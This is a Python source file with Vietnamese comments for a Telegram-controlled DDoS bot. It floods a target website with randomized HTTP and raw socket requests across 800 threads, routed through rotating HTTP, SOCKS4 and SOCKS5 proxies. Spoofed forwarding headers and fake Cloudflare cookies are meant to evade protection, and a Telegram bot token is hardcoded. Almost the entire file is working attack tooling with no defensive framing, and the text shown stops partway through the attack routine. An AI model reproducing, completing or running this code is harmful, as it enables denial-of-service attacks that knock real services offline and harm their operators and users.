# =====================================================
# DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY
# TỰ ĐỘNG TẢI, LƯU, RELOAD PROXY TỪ TELEGRAM
# =====================================================

import requests
import threading
import random
import time
import os
import socket
import ssl
import json
import sys
import re
import logging
import hashlib
import base64
import shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, quote
import socks
from flask import Flask, jsonify, render_template_string

# -------------------- CẤU HÌNH --------------------
TELEGRAM_BOT_TOKEN = "6320148381:AAGj1RnEXBmNuWBhJF8l7OvcQTwhh6VTa-s"  # THAY TOKEN THẬT
THREAD_COUNT = 800
REQUESTS_PER_SECOND = 500
MAX_RUN_TIME = 120
CONNECTION_POOL = 150
TIMEOUT = 1.5
COOLDOWN_TIME = 1800  # 30 phút
AUTO_SAVE_PROXY = True  # Tự động lưu proxy
PROXY_BACKUP_FILE = "proxy_backup.json"  # File backup proxy

# -------------------- BIẾN TOÀN CỤC --------------------
stop_event = threading.Event()
is_running = False
attack_thread = None
proxy_list = []
proxy_http = []
proxy_socks5 = []
proxy_socks4 = []
user_agents = []
proxy_update_time = 0
heartbeat_count = 0
last_activity = time.time()
bot_start_time = time.time()
chat_id_saved = None
cooldown_timer = None
is_cooldown = False
last_attack_time = 0

current_target = {
    'url': 'http://192.168.1.100:8080',
    'host': '192.168.1.100',
    'port': 8080,
    'ssl': False
}

attack_stats = {
    'total_requests': 0,
    'success_count': 0,
    'fail_count': 0,
    'status_codes': {},
    'bytes_sent': 0,
    'start_time': 0,
    'session_count': 0,
    'current_target': '',
    'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0},
    'max_speed': 0,
    'avg_speed': 0,
    'errors': 0,
    'cf_challenges': 0,
    'cf_passed': 0
}
stats_lock = threading.Lock()

dns_cache = {}
dns_cache_lock = threading.Lock()
session_pool = []

# =====================================================
# LOAD USER-AGENT
# =====================================================
def load_user_agents():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    ]
    if os.path.exists("user_agents.txt"):
        with open("user_agents.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    agents.append(line)
    return agents

user_agents = load_user_agents()

# =====================================================
# QUẢN LÝ PROXY - TỰ ĐỘNG LƯU
# =====================================================
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    proxy_type = 'http'
    proxy_dict = {}
    
    try:
        if '://' in line:
            proto, rest = line.split('://', 1)
            proto = proto.lower()
            if proto in ['socks5', 'socks4', 'http', 'https']:
                proxy_type = proto if proto != 'https' else 'http'
                
                if '@' in rest:
                    auth, addr = rest.split('@', 1)
                    if ':' in auth:
                        user, passwd = auth.split(':', 1)
                        proxy_dict['user'] = user
                        proxy_dict['pass'] = passwd
                else:
                    addr = rest
                
                if ':' in addr:
                    ip, port = addr.rsplit(':', 1)
                    proxy_dict['ip'] = ip
                    proxy_dict['port'] = int(port)
                else:
                    return None
                
                proxy_dict['type'] = proxy_type
                proxy_dict['raw'] = line
                proxy_dict['protocol'] = proto
                return proxy_dict
        
        elif '@' in line:
            auth, addr = line.split('@', 1)
            if ':' in auth and ':' in addr:
                user, passwd = auth.split(':', 1)
                ip, port = addr.rsplit(':', 1)
                proxy_dict = {
                    'type': 'http',
                    'ip': ip,
                    'port': int(port),
                    'user': user,
                    'pass': passwd,
                    'raw': f"http://{user}:{passwd}@{ip}:{port}",
                    'protocol': 'http'
                }
                return proxy_dict
        
        elif ':' in line:
            ip, port = line.rsplit(':', 1)
            try:
                port_int = int(port)
                if 1 <= port_int <= 65535:
                    proxy_dict = {
                        'type': 'http',
                        'ip': ip,
                        'port': port_int,
                        'raw': f"http://{ip}:{port}",
                        'protocol': 'http'
                    }
                    return proxy_dict
            except:
                pass
    
    except Exception:
        return None
    
    return None

def load_proxies(filepath):
    http_proxies = []
    socks5_proxies = []
    socks4_proxies = []
    
    if not os.path.exists(filepath):
        return [], [], []
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                proxy = parse_proxy_line(line)
                if proxy:
                    if proxy['type'] == 'http':
                        http_proxies.append(proxy)
                    elif proxy['type'] == 'socks5':
                        socks5_proxies.append(proxy)
                    elif proxy['type'] == 'socks4':
                        socks4_proxies.append(proxy)
    except Exception:
        pass
    
    return http_proxies, socks5_proxies, socks4_proxies

# =====================================================
# TỰ ĐỘNG LƯU PROXY VÀO FILE JSON
# =====================================================
def save_proxy_to_backup(proxy_dict):
    """Lưu proxy vào file backup JSON"""
    if not AUTO_SAVE_PROXY:
        return
    
    try:
        # Đọc backup hiện có
        backup_data = []
        if os.path.exists(PROXY_BACKUP_FILE):
            with open(PROXY_BACKUP_FILE, 'r', encoding='utf-8') as f:
                backup_data = json.load(f)
        
        # Thêm proxy mới
        proxy_entry = {
            'raw': proxy_dict.get('raw', ''),
            'ip': proxy_dict.get('ip', ''),
            'port': proxy_dict.get('port', 0),
            'type': proxy_dict.get('type', 'http'),
            'protocol': proxy_dict.get('protocol', 'http'),
            'user': proxy_dict.get('user', ''),
            'pass': proxy_dict.get('pass', ''),
            'added_time': time.time()
        }
        
        # Kiểm tra trùng lặp
        exists = False
        for p in backup_data:
            if p.get('raw') == proxy_entry['raw']:
                exists = True
                p['added_time'] = time.time()
                break
        
        if not exists:
            backup_data.append(proxy_entry)
        
        # Giới hạn số lượng proxy lưu (tối đa 10000)
        if len(backup_data) > 10000:
            backup_data = backup_data[-10000:]
        
        # Lưu lại
        with open(PROXY_BACKUP_FILE, 'w', encoding='utf-8') as f:
            json.dump(backup_data, f, indent=2, ensure_ascii=False)
        
        return True
    except Exception as e:
        return False

def load_proxy_from_backup():
    """Tải proxy từ file backup"""
    if not os.path.exists(PROXY_BACKUP_FILE):
        return [], [], []
    
    try:
        with open(PROXY_BACKUP_FILE, 'r', encoding='utf-8') as f:
            backup_data = json.load(f)
        
        http_proxies = []
        socks5_proxies = []
        socks4_proxies = []
        
        for entry in backup_data:
            proxy_dict = {
                'type': entry.get('type', 'http'),
                'ip': entry.get('ip', ''),
                'port': entry.get('port', 0),
                'raw': entry.get('raw', ''),
                'protocol': entry.get('protocol', 'http')
            }
            if entry.get('user'):
                proxy_dict['user'] = entry.get('user')
                proxy_dict['pass'] = entry.get('pass', '')
            
            if proxy_dict['type'] == 'http':
                http_proxies.append(proxy_dict)
            elif proxy_dict['type'] == 'socks5':
                socks5_proxies.append(proxy_dict)
            elif proxy_dict['type'] == 'socks4':
                socks4_proxies.append(proxy_dict)
        
        return http_proxies, socks5_proxies, socks4_proxies
    except Exception:
        return [], [], []

def merge_proxies_from_file(file_path, chat_id):
    """Hợp nhất proxy từ file vào backup"""
    global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
    
    http, socks5, socks4 = load_proxies(file_path)
    total = len(http) + len(socks5) + len(socks4)
    
    if total == 0:
        send_telegram(f"❌ Không có proxy hợp lệ trong file.", chat_id)
        return False
    
    # Lưu từng proxy vào backup
    for proxy in http + socks5 + socks4:
        save_proxy_to_backup(proxy)
    
    # Load lại từ backup
    proxy_http, proxy_socks5, proxy_socks4 = load_proxy_from_backup()
    proxy_list = proxy_http + proxy_socks5 + proxy_socks4
    proxy_update_time = time.time()
    
    # Ghi vào file proxies.txt
    save_proxy_to_text_file()
    
    send_telegram(f"""
🔄 Đã hợp nhất proxy:
📊 HTTP: {len(proxy_http)}
📊 SOCKS5: {len(proxy_socks5)}
📊 SOCKS4: {len(proxy_socks4)}
📊 Tổng: {len(proxy_list)}
💾 Đã lưu backup: {PROXY_BACKUP_FILE}
    """, chat_id)
    return True

def save_proxy_to_text_file():
    """Lưu proxy vào file proxies.txt từ backup"""
    try:
        # Load từ backup
        http, socks5, socks4 = load_proxy_from_backup()
        all_proxies = http + socks5 + socks4
        
        if not all_proxies:
            return
        
        # Ghi vào file
        with open('proxies.txt', 'w', encoding='utf-8') as f:
            f.write("# Proxy list - Tự động lưu\n")
            f.write(f"# Số lượng: {len(all_proxies)}\n")
            f.write(f"# Cập nhật: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# ====================================\n\n")
            
            for proxy in all_proxies:
                raw = proxy.get('raw', '')
                if raw:
                    f.write(raw + '\n')
        
        return True
    except Exception:
        return False

def reload_proxy_from_backup():
    """Tải lại proxy từ backup"""
    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
    
    http, socks5, socks4 = load_proxy_from_backup()
    total = len(http) + len(socks5) + len(socks4)
    
    if total > 0:
        proxy_http = http
        proxy_socks5 = socks5
        proxy_socks4 = socks4
        proxy_list = http + socks5 + socks4
        proxy_update_time = time.time()
        send_telegram(f"🔄 Đã tải lại proxy từ backup: {total} proxy")
        return True
    return False

# =====================================================
# CẬP NHẬT PROXY - TỰ ĐỘNG LƯU
# =====================================================
def update_proxies_from_file(file_path, chat_id):
    global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
    
    http, socks5, socks4 = load_proxies(file_path)
    total = len(http) + len(socks5) + len(socks4)
    
    if total == 0:
        send_telegram(f"❌ Không có proxy hợp lệ trong file.", chat_id)
        return False
    
    # Lưu vào backup
    for proxy in http + socks5 + socks4:
        save_proxy_to_backup(proxy)
    
    # Load từ backup
    proxy_http, proxy_socks5, proxy_socks4 = load_proxy_from_backup()
    proxy_list = proxy_http + proxy_socks5 + proxy_socks4
    proxy_update_time = time.time()
    
    # Ghi vào file txt
    save_proxy_to_text_file()
    
    send_telegram(f"""
🔄 Đã cập nhật proxy:
📊 HTTP: {len(proxy_http)}
📊 SOCKS5: {len(proxy_socks5)}
📊 SOCKS4: {len(proxy_socks4)}
📊 Tổng: {len(proxy_list)}
💾 Đã lưu backup: {PROXY_BACKUP_FILE}
    """, chat_id)
    return True

# =====================================================
# TỰ ĐỘNG LƯU PROXY KHI NHẬN FILE TỪ TELEGRAM
# =====================================================
def download_telegram_file(file_id, save_path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
        params = {'file_id': file_id}
        r = requests.get(url, params=params, timeout=10)
        if r.status_code != 200:
            return False
        
        data = r.json()
        if not data.get('ok'):
            return False
        
        file_path = data['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        
        r = requests.get(download_url, timeout=30)
        if r.status_code != 200:
            return False
        
        with open(save_path, 'wb') as f:
            f.write(r.content)
        return True
    except:
        return False

def handle_proxy_file(file_id, file_name, chat_id):
    """Xử lý file proxy nhận từ Telegram"""
    save_path = f"proxy_{int(time.time())}.txt"
    
    send_telegram(f"📥 Đang tải file proxy: {file_name}", chat_id)
    
    if download_telegram_file(file_id, save_path):
        # Hợp nhất proxy
        if merge_proxies_from_file(save_path, chat_id):
            # Lưu file vào thư mục proxy_history
            os.makedirs('proxy_history', exist_ok=True)
            history_path = f"proxy_history/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_name}"
            shutil.copy(save_path, history_path)
            
            send_telegram(f"""
✅ Đã lưu proxy thành công!
📁 File gốc: {file_name}
📁 Backup: {PROXY_BACKUP_FILE}
📁 Lịch sử: {history_path}
📊 Tổng proxy: {len(proxy_list)}
            """, chat_id)
        
        # Xóa file tạm
        threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
    else:
        send_telegram("❌ Không thể tải file proxy.", chat_id)

# =====================================================
# TỰ ĐỘNG RELOAD PROXY MỖI 10 PHÚT
# =====================================================
def auto_reload_proxy():
    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
    
    while True:
        time.sleep(600)  # 10 phút
        
        # Tải lại từ backup
        http, socks5, socks4 = load_proxy_from_backup()
        total = len(http) + len(socks5) + len(socks4)
        
        if total > 0:
            # Kiểm tra xem có thay đổi không
            current_total = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
            if total != current_total:
                proxy_http = http
                proxy_socks5 = socks5
                proxy_socks4 = socks4
                proxy_list = http + socks5 + socks4
                proxy_update_time = time.time()
                save_proxy_to_text_file()
                print(f"[+] Auto reload proxy: {total} proxy")

# =====================================================
# GỬI TELEGRAM
# =====================================================
def send_telegram(message, chat_id=None, retry=2):
    global last_activity, chat_id_saved
    
    last_activity = time.time()
    
    if chat_id:
        chat_id_saved = chat_id
        try:
            with open('chat_id.txt', 'w') as f:
                f.write(str(chat_id))
        except:
            pass
    
    target_chat = chat_id or chat_id_saved
    if not target_chat:
        try:
            if os.path.exists('chat_id.txt'):
                with open('chat_id.txt', 'r') as f:
                    target_chat = f.read().strip()
        except:
            pass
    
    if not target_chat:
        return False
    
    for i in range(retry):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': target_chat,
                'text': message,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True
            }
            r = requests.post(url, data=payload, timeout=5)
            if r.status_code == 200:
                return True
        except:
            time.sleep(0.5)
    
    return False

# =====================================================
# RESOLVE DNS
# =====================================================
def resolve_host(host):
    with dns_cache_lock:
        if host in dns_cache:
            return dns_cache[host]
    
    try:
        ip = socket.gethostbyname(host)
        with dns_cache_lock:
            dns_cache[host] = ip
        return ip
    except:
        return host

# =====================================================
# SESSION POOL
# =====================================================
class SessionPool:
    def __init__(self, max_size=150):
        self.pool = []
        self.max_size = max_size
        self.lock = threading.Lock()
        self.created = 0
    
    def get_session(self, proxy_dict=None):
        with self.lock:
            for i, session in enumerate(self.pool):
                try:
                    if hasattr(session, 'head'):
                        session.head('http://google.com', timeout=1)
                        return self.pool.pop(i)
                except:
                    continue
            
            return self._create_session(proxy_dict)
    
    def return_session(self, session):
        if session and len(self.pool) < self.max_size:
            with self.lock:
                self.pool.append(session)
    
    def _create_session(self, proxy_dict=None):
        session = requests.Session()
        session.timeout = TIMEOUT
        session.verify = False
        session.trust_env = False
        
        try:
            session.headers.update({'Connection': 'keep-alive, Upgrade'})
        except:
            pass
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        if proxy_dict and proxy_dict['type'] == 'http':
            session.proxies = {
                'http': proxy_dict['raw'],
                'https': proxy_dict['raw']
            }
        
        self.created += 1
        return session

session_pool = SessionPool(CONNECTION_POOL)

# =====================================================
# PARSE URL
# =====================================================
def parse_target_url(url_string):
    if not url_string.startswith(('http://', 'https://')):
        url_string = 'http://' + url_string
    
    parsed = urlparse(url_string)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    ssl = parsed.scheme == 'https'
    
    if not parsed.path:
        url_string = url_string.rstrip('/') + '/'
    
    return {
        'url': url_string,
        'host': host,
        'port': port,
        'ssl': ssl,
        'path': parsed.path or '/',
        'query': parsed.query or ''
    }

# =====================================================
# TẠO HEADER
# =====================================================
def generate_headers():
    fingerprint = hashlib.md5(str(random.randint(1, 9999999)).encode()).hexdigest()[:16]
    
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive, Upgrade',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Sec-Ch-Ua': f'"Chromium";v="{random.randint(120,124)}", "Google Chrome";v="{random.randint(120,124)}"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'CF-IPCountry': random.choice(['US', 'VN', 'JP', 'DE', 'GB', 'FR', 'CA', 'AU', 'SG', 'KR']),
        'Referer': random.choice([
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://twitter.com/',
            'https://www.instagram.com/',
            'https://www.tiktok.com/'
        ]),
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': f"_cf_bm={fingerprint}; __cfduid={hashlib.md5(str(time.time()).encode()).hexdigest()[:32]}"
    }

# =====================================================
# TẤN CÔNG HTTP
# =====================================================
def attack_http(proxy_dict, target):
    session = None
    try:
        session = session_pool.get_session(proxy_dict)
        
        method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH'])
        headers = generate_headers()
        
        url = target['url']
        if method in ['GET', 'HEAD']:
            params = {f'p{random.randint(1,9999)}': 'x'*random.randint(10,200) for _ in range(random.randint(2,5))}
            url += '?' + '&'.join([f"{k}={v}" for k,v in params.items()])
        
        if method == 'GET':
            r = session.get(url, headers=headers, timeout=TIMEOUT)
        elif method == 'POST':
            data = {f'f{i}': 'v'*random.randint(50,500) for i in range(10)}
            r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
        elif method == 'HEAD':
            r = session.head(url, headers=headers, timeout=TIMEOUT)
        elif method == 'OPTIONS':
            r = session.options(url, headers=headers, timeout=TIMEOUT)
        elif method == 'PUT':
            data = {'data': 'x'*random.randint(100,1000)}
            r = session.put(url, json=data, headers=headers, timeout=TIMEOUT)
        else:
            data = {'data': 'x'*random.randint(100,1000)}
            r = session.patch(url, json=data, headers=headers, timeout=TIMEOUT)
        
        session_pool.return_session(session)
        
        if r.status_code == 503 or 'cf-challenge' in str(r.headers):
            with stats_lock:
                attack_stats['cf_challenges'] += 1
        elif r.status_code == 200 or r.status_code == 403:
            with stats_lock:
                attack_stats['cf_passed'] += 1
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            code = str(r.status_code)
            attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
            if 200 <= r.status_code < 400:
                attack_stats['success_count'] += 1
            else:
                attack_stats['fail_count'] += 1
            attack_stats['bytes_sent'] += len(r.request.body or b'') + 300
            if proxy_dict:
                attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
            else:
                attack_stats['proxy_stats']['raw'] = attack_stats['proxy_stats'].get('raw', 0) + 1
        return True
        
    except Exception:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
            attack_stats['errors'] += 1
        
        if session:
            try:
                session.close()
            except:
                pass
        return False

# =====================================================
# TẤN CÔNG SOCKET
# =====================================================
def create_socks_socket(proxy_dict):
    try:
        sock = socks.socksocket()
        sock.settimeout(TIMEOUT)
        
        proxy_type = socks.SOCKS5 if proxy_dict['type'] == 'socks5' else socks.SOCKS4
        
        if 'user' in proxy_dict and 'pass' in proxy_dict:
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'],
                          username=proxy_dict['user'], password=proxy_dict['pass'])
        else:
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'])
        
        return sock
    except:
        return None

def attack_socket(proxy_dict, target):
    sock = None
    try:
        if proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
            sock = create_socks_socket(proxy_dict)
            if not sock:
                return False
            sock.connect((resolve_host(target['host']), target['port']))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((resolve_host(target['host']), target['port']))
        
        if target['ssl']:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target['host'])
        
        path = '/' + 'x'*random.randint(5,200) + f'?id={random.randint(1,999999)}&t={time.time()}'
        headers = generate_headers()
        request = f"GET {path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"
        
        for _ in range(random.randint(2,5)):
            sock.send(request.encode())
        
        sock.close()
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['success_count'] += 1
            attack_stats['bytes_sent'] += len(request) * 3
            if proxy_dict:
                attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
            else:
                attack_stats['proxy_stats']['raw'] = attack_stats['proxy_stats'].get('raw', 0) + 1
        return True
        
    except Exception:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
            attack_stats['errors'] += 1
        
        try:
            if sock:
                sock.close()
        except:
            pass
        return False

# =====================================================
# ATTACK WORKER
# =====================================================
def attack_worker(proxy_pools, target):
    http_proxies, socks5_proxies, socks4_proxies = proxy_pools
    
    while not stop_event.is_set():
        try:
            total_http = len(http_proxies)
            total_socks5 = len(socks5_proxies)
            total_socks4 = len(socks4_proxies)
            total = total_http + total_socks5 + total_socks4
            
            if total == 0:
                attack_socket(None, target)
            else:
                r = random.random()
                if r < 0.4 and total_http > 0:
                    proxy = random.choice(http_proxies)
                    attack_http(proxy, target)
                elif r < 0.7 and total_socks5 > 0:
                    proxy = random.choice(socks5_proxies)
                    attack_socket(proxy, target)
                elif r < 0.85 and total_socks4 > 0:
                    proxy = random.choice(socks4_proxies)
                    attack_socket(proxy, target)
                else:
                    attack_socket(None, target)
            
            time.sleep(1.0 / REQUESTS_PER_SECOND)
            
        except Exception:
            continue

# =====================================================
# COOLDOWN
# =====================================================
def start_cooldown():
    global is_cooldown, cooldown_timer
    
    is_cooldown = True
    send_telegram(f"⏳ COOLDOWN: {COOLDOWN_TIME//60} phút - Đợi trước khi tấn công tiếp.")
    
    time.sleep(COOLDOWN_TIME)
    is_cooldown = False
    send_telegram("✅ COOLDOWN KẾT THÚC! Sẵn sàng tấn công.")

# =====================================================
# THỐNG KÊ
# =====================================================
def get_stats_text():
    with stats_lock:
        elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        rate = total / max(elapsed, 1)
        max_speed = attack_stats.get('max_speed', 0)
        bytes_sent = attack_stats['bytes_sent'] / (1024 * 1024)
        codes = ', '.join([f"{k}:{v}" for k,v in list(attack_stats['status_codes'].items())[:5]])
        errors = attack_stats.get('errors', 0)
        cf_challenges = attack_stats.get('cf_challenges', 0)
        cf_passed = attack_stats.get('cf_passed', 0)
        
        remaining = max(0, MAX_RUN_TIME - elapsed)
        status = "🟢 ĐANG TẤN CÔNG" if is_running else "🔴 CHỜ LỆNH"
        cooldown_status = "⏳ COOLDOWN" if is_cooldown else "✅ SẴN SÀNG"
        
        uptime = int(time.time() - bot_start_time)
        uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
        
        proxy_stats = attack_stats.get('proxy_stats', {})
        
        return f"""
<b>🔥 NEXUS STRESS PANEL v6 - DDOS BOT 5.0</b>
📌 Trạng thái: {status}
⏳ Cooldown: {cooldown_status}
⏱ Uptime: {uptime_str}
🎯 Target: {attack_stats.get('current_target', 'Chưa có')}
⏱ Đợt này: {elapsed}s / {MAX_RUN_TIME}s
⏳ Còn lại: {remaining}s
📨 Tổng request: {total:,}
✅ Thành công: {success:,}
❌ Thất bại: {fail:,}
⚠️ Lỗi: {errors}
🛡 CF Challenge: {cf_challenges}
✅ CF Passed: {cf_passed}
📈 Tốc độ: {rate:.1f} req/s
⚡ Max: {max_speed:.1f} req/s
💾 Dữ liệu: {bytes_sent:.2f} MB
📊 Mã trạng thái: {codes or 'N/A'}
🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
📊 Proxy dùng: H={proxy_stats.get('http',0)} S5={proxy_stats.get('socks5',0)} S4={proxy_stats.get('socks4',0)} R={proxy_stats.get('raw',0)}
🧵 Luồng: {THREAD_COUNT}
⚙️ Tốc độ cài: {REQUESTS_PER_SECOND} req/s
❤️ Heartbeat: {heartbeat_count}
💾 Backup proxy: {PROXY_BACKUP_FILE}
        """

# =====================================================
# CHẠY TẤN CÔNG
# =====================================================
def run_attack(target, chat_id):
    global is_running, current_target, last_attack_time, is_cooldown
    
    if is_cooldown:
        send_telegram("⏳ ĐANG TRONG COOLDOWN! Vui lòng chờ.", chat_id)
        return
    
    current_target = target
    last_attack_time = time.time()
    
    with stats_lock:
        attack_stats['current_target'] = target['url']
        attack_stats.update({
            'total_requests': 0,
            'success_count': 0,
            'fail_count': 0,
            'status_codes': {},
            'bytes_sent': 0,
            'start_time': time.time(),
            'session_count': attack_stats.get('session_count', 0) + 1,
            'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0},
            'max_speed': 0,
            'errors': 0,
            'cf_challenges': 0,
            'cf_passed': 0
        })
    
    stop_event.clear()
    is_running = True
    
    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
    send_telegram(f"""
▶️ <b>BẮT ĐẦU TẤN CÔNG!</b>
🎯 {target['url']}
🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
📊 Tổng proxy: {total_proxy}
⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
⏱ {MAX_RUN_TIME}s
🛡 CF-UAM: ĐÃ BẬT
💾 Proxy backup: {PROXY_BACKUP_FILE}
    """, chat_id)
    
    proxy_pools = (proxy_http, proxy_socks5, proxy_socks4)
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(attack_worker, proxy_pools, target) for _ in range(THREAD_COUNT)]
        
        start = time.time()
        last_report = 0
        
        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
            time.sleep(1)
            elapsed = int(time.time() - start)
            
            if elapsed > 0:
                with stats_lock:
                    rate = attack_stats['total_requests'] / elapsed
                    if rate > attack_stats['max_speed']:
                        attack_stats['max_speed'] = rate
            
            if elapsed - last_report >= 15:
                last_report = elapsed
                with stats_lock:
                    total = attack_stats['total_requests']
                    rate = total / max(elapsed, 1)
                    max_speed = attack_stats['max_speed']
                    proxy_stats = attack_stats.get('proxy_stats', {})
                    cf_challenges = attack_stats.get('cf_challenges', 0)
                    cf_passed = attack_stats.get('cf_passed', 0)
                send_telegram(f"""
⚡ {elapsed}s | {rate:.1f} req/s | Max: {max_speed:.1f}
📨 {total:,} | H:{proxy_stats.get('http',0)} S5:{proxy_stats.get('socks5',0)} S4:{proxy_stats.get('socks4',0)}
🛡 CF: {cf_challenges} challenges | {cf_passed} passed
                """, chat_id)
    
    stop_event.set()
    is_running = False
    
    threading.Thread(target=start_cooldown, daemon=True).start()
    
    with stats_lock:
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        elapsed = int(time.time() - attack_stats['start_time'])
        rate = total / max(elapsed, 1)
        max_speed = attack_stats['max_speed']
